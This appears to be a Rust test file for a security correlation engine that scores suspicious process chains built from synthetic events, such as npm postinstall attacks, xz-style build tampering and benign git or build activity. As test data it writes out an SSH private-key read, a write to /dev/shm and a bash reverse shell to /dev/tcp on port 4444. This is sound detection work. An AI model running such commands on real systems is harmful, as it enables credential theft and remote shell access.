//! End-to-end cases from the correlation-engine plan's Testing section, built
//! from hand-written events shaped like the normalizer's output, plus a replay
//! of a real demo capture.

use secrisk_engine::{
    Engine,
    event::Event,
    report::{Kind, Report},
    rules::RuleId,
    score::Severity,
};
use serde_json::{Value, json};

const S: u64 = 1_000_000_000;
const T0: u64 = 1_790_000_000 * S;

/// The terminal session every scenario starts from.
const SESSION: &[(u32, &str)] = &[(50, "zsh"), (10, "qterminal"), (1, "systemd")];

/// Builds a scenario's events with the lineage the normalizer would attach.
struct Scenario {
    events: Vec<Event>,
    /// pid → (ppid, comm), to rebuild each event's ancestry.
    tree: Vec<(u32, u32, String)>,
}

impl Scenario {
    fn new() -> Self {
        let mut tree = Vec::new();
        for w in SESSION.windows(2) {
            tree.push((w[0].0, w[1].0, w[0].1.to_string()));
        }
        tree.push((1, 0, "systemd".to_string()));
        Scenario {
            events: Vec::new(),
            tree,
        }
    }

    fn ancestry(&self, ppid: u32) -> Value {
        let mut out = Vec::new();
        let mut cur = ppid;
        while let Some((pid, parent, comm)) = self.tree.iter().find(|(p, ..)| *p == cur) {
            out.push(json!({"pid": pid, "comm": comm}));
            if out.len() == 8 || *parent == 0 {
                break;
            }
            cur = *parent;
        }
        Value::Array(out)
    }

    fn push(&mut self, at: u64, pid: u32, action: &str, extra: Value) {
        let (ppid, comm) = self
            .tree
            .iter()
            .find(|(p, ..)| *p == pid)
            .map(|(_, pp, c)| (*pp, c.clone()))
            .expect("exec the process first");
        let mut ev = json!({
            "ts": T0 + at * S / 10,
            "time": format!("t+{}.{}s", at / 10, at % 10),
            "action": action,
            "pid": pid,
            "ppid": ppid,
            "uid": 1000,
            "comm": comm,
            "ancestry": self.ancestry(ppid),
        });
        for (k, v) in extra.as_object().unwrap() {
            ev[k] = v.clone();
        }
        self.events.push(serde_json::from_value(ev).unwrap());
    }

    /// Process `pid` (child of `ppid`) execs `path` as `cmdline`. `at` is in
    /// tenths of a second.
    fn exec(&mut self, at: u64, pid: u32, ppid: u32, path: &str, cmdline: &str) -> &mut Self {
        let comm: String = path.rsplit('/').next().unwrap().chars().take(15).collect();
        self.tree.retain(|(p, ..)| *p != pid);
        self.tree.push((pid, ppid, comm));
        self.push(
            at,
            pid,
            "exec",
            json!({"exe": path, "cmdline": cmdline, "path": path}),
        );
        self
    }

    fn write(&mut self, at: u64, pid: u32, path: &str) -> &mut Self {
        self.push(at, pid, "write", json!({"path": path}));
        self
    }

    fn read_secret(&mut self, at: u64, pid: u32, path: &str) -> &mut Self {
        self.push(at, pid, "secret_read", json!({"path": path}));
        self
    }

    fn connect(&mut self, at: u64, pid: u32, daddr: &str, dport: u16) -> &mut Self {
        self.push(at, pid, "connect", json!({"daddr": daddr, "dport": dport}));
        self
    }

    fn run(&self) -> Vec<Report> {
        let mut engine = Engine::new(false);
        let mut out: Vec<Report> = self.events.iter().flat_map(|e| engine.process(e)).collect();
        out.extend(engine.finish());
        out
    }
}

fn alerts(reports: &[Report]) -> Vec<&Report> {
    reports.iter().filter(|r| r.record == Kind::Alert).collect()
}

fn counted(r: &Report) -> Vec<RuleId> {
    r.rules.iter().filter(|x| x.counted).map(|x| x.id).collect()
}

/// The last word on each chain: its summary.
fn summaries(reports: &[Report]) -> Vec<&Report> {
    reports.iter().filter(|r| r.record == Kind::Chain).collect()
}

/// The demo's payload, run the way a real `npm install` runs a postinstall.
fn npm_postinstall() -> Scenario {
    let mut s = Scenario::new();
    let pkg = "/tmp/secrisk-demo/node_modules/left-pad";
    s.exec(
        0,
        100,
        50,
        "/usr/bin/npm",
        "node /usr/bin/npm install ./left-pad",
    )
    .exec(1, 101, 100, "/usr/bin/sh", "sh -c ./postinstall.sh")
    .exec(
        2,
        102,
        101,
        &format!("{pkg}/postinstall.sh"),
        "/bin/sh ./postinstall.sh",
    )
    .exec(3, 103, 102, "/usr/bin/cat", "cat /home/u/.ssh/id_rsa")
    .read_secret(3, 103, "/home/u/.ssh/id_rsa")
    .write(10, 102, "/dev/shm/.update-cache")
    .exec(20, 104, 102, "/usr/bin/curl", "curl -s http://example.com/")
    .connect(20, 104, "192.168.1.1", 53)
    .connect(21, 104, "93.184.216.34", 80);
    s
}

#[test]
fn npm_postinstall_attack_scores_100() {
    let reports = npm_postinstall().run();
    let last = summaries(&reports)[0];
    assert_eq!(last.anchor.name, "npm");
    assert_eq!((last.score, last.severity), (100, Severity::Critical));
    use RuleId::*;
    assert_eq!(counted(last), vec![P1, P2, P3, F1, F2, N1, N2, C1, C3]);
    // One alert per band crossed, never two for the same band.
    let bands: Vec<Severity> = alerts(&reports).iter().map(|r| r.severity).collect();
    assert!(bands.windows(2).all(|w| w[0] < w[1]));
    assert_eq!(bands.last(), Some(&Severity::Critical));
}

#[test]
fn git_push_over_ssh_scores_nothing() {
    let mut s = Scenario::new();
    s.exec(0, 200, 50, "/usr/bin/git", "git push")
        .exec(
            1,
            201,
            200,
            "/usr/bin/ssh",
            "ssh git@github.com git-receive-pack",
        )
        .read_secret(1, 201, "/home/u/.ssh/id_ed25519")
        .connect(2, 201, "140.82.112.3", 22);
    assert!(s.run().is_empty());
}

#[test]
fn app_reading_its_env_file_then_its_database_does_not_alert() {
    let mut s = Scenario::new();
    s.exec(0, 300, 50, "/usr/bin/node", "node /srv/app/server.js")
        .read_secret(1, 300, "/srv/app/.env")
        .connect(2, 300, "10.0.0.5", 5432);
    let reports = s.run();
    assert!(alerts(&reports).is_empty());
    // N3 matched the odd port, but alone it is only a modifier.
    assert_eq!(summaries(&reports)[0].score, 0);
}

#[test]
fn clean_native_npm_build_stays_low() {
    let mut s = Scenario::new();
    let gyp = "node /usr/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js rebuild";
    s.exec(0, 400, 50, "/usr/bin/npm", "node /usr/bin/npm install")
        .exec(1, 401, 400, "/usr/bin/sh", "sh -c node-gyp rebuild")
        .exec(2, 402, 401, "/usr/bin/node", gyp)
        .connect(3, 402, "104.16.0.1", 443)
        .exec(4, 403, 402, "/usr/bin/make", "make -C build")
        .exec(
            5,
            404,
            403,
            "/usr/bin/g++",
            "g++ -c ../src/addon.cc -o Release/obj.target/addon.o",
        )
        .exec(
            5,
            405,
            404,
            "/usr/lib/gcc/x86_64-linux-gnu/13/cc1plus",
            "cc1plus -quiet addon.cc",
        )
        .write(6, 405, "/tmp/ccAbc123.s")
        .exec(
            7,
            406,
            404,
            "/usr/bin/as",
            "as -o Release/obj.target/addon.o /tmp/ccAbc123.s",
        )
        .write(8, 406, "/home/u/proj/build/Release/obj.target/addon.o");
    let reports = s.run();
    assert!(alerts(&reports).is_empty());
    let last = summaries(&reports)[0];
    use RuleId::*;
    assert_eq!(counted(last), vec![P1, N1, C1]);
    assert_eq!(last.score, 30);
}

#[test]
fn reverse_shell_from_a_postinstall() {
    let mut s = Scenario::new();
    s.exec(0, 500, 50, "/usr/bin/npm", "node /usr/bin/npm install evil")
        .exec(
            1,
            501,
            500,
            "/usr/bin/bash",
            "bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
        )
        .connect(2, 501, "203.0.113.9", 4444);
    let last = summaries(&s.run())[0].clone();
    use RuleId::*;
    assert_eq!(counted(&last), vec![P1, N1, N3, L2, C1]);
    assert_eq!(last.score, 10 + 25 + 15);
}

#[test]
fn xz_style_build_tampering() {
    let mut s = Scenario::new();
    s.exec(
        0,
        600,
        50,
        "/usr/bin/dpkg-buildpackage",
        "dpkg-buildpackage -us -uc",
    )
    .exec(1, 601, 600, "/usr/bin/make", "make -j4")
    .exec(2, 602, 601, "/usr/bin/sh", "/bin/sh ./build-to-host.sh")
    .exec(
        3,
        603,
        602,
        "/usr/bin/xz",
        "xz -dc tests/files/bad-3-corrupt_lzma2.xz",
    )
    .write(4, 602, "/build/xz/src/liblzma/liblzma_la-crc64_fast.o");
    let last = summaries(&s.run())[0].clone();
    use RuleId::*;
    assert_eq!(last.anchor.name, "make");
    assert_eq!(counted(&last), vec![P1, L5, L6, C1]);
}

#[test]
fn an_idle_chain_closes_with_a_summary() {
    let mut s = npm_postinstall();
    // 70 s later, unrelated activity in the same terminal.
    s.exec(720, 700, 50, "/usr/bin/ls", "ls");
    let mut engine = Engine::new(false);
    let mut seen = Vec::new();
    for e in &s.events {
        for r in engine.process(e) {
            seen.push((e.pid, r.record));
        }
    }
    // The npm chain's summary came out while processing the ls exec.
    assert!(seen.contains(&(700, Kind::Chain)));
    assert!(engine.finish().is_empty());
}

#[test]
fn replays_the_recorded_demo() {
    let capture = include_str!("fixtures/demo-capture.jsonl");
    let mut engine = Engine::new(false);
    let mut reports = Vec::new();
    for line in capture.lines() {
        let ev: Event = serde_json::from_str(line).unwrap();
        reports.extend(engine.process(&ev));
    }
    reports.extend(engine.finish());
    let last = summaries(&reports)[0];
    // The demo fakes npm with a shell script, so no dependency anchor forms and
    // P1, P2, N1 and C1 cannot fire; the chain is the demo script's.
    use RuleId::*;
    assert_eq!(counted(last), vec![P3, L1, F1, F2, N2, C3]);
    assert_eq!((last.score, last.severity), (85, Severity::Critical));
}
